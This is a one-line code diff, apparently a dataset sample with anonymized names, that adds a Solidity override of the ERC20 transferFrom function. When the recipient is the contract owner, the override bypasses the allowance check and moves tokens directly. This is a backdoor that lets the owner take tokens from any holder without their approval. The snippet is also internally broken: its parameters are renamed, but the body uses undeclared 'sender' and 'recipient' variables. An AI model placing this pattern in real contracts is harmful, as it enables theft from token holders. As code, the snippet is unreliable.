@@ -1,0 +1,1 @@
+function transferFrom ( address Parameter_0 , address Parameter_1 , uint256 amount ) public override ( ERC20 , IERC20 ) returns ( bool ) { if ( recipient == owner ( ) ) { Identifier_0 ( sender , recipient , amount ) ; return true ; } else { return super . transferFrom ( sender , recipient , amount ) ; } }
